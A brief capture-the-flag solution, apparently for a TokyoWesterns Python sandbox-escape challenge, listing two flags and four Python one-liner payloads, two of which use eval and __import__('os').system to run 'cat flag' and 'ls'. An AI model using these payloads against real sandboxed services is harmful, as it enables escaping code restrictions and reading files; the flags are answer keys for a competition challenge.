* By Kaibro , Djosix
* TWCTF{go_to_next_challenge_running_on_port_30002}
* TWCTF{baby_sandb0x_escape_with_pythons}

```python
[1][((lambda: print('GGININDER'))() and 0) or 0]
[1][((lambda: sys.stdout.write('GGININDER'))() and 0) or 0]
[1][((lambda: eval("__import__('os').system('cat flag')"))() and 0) or 0]
[1][((lambda: eval("__import__('os').system('ls')"))() and 0) or 0]
```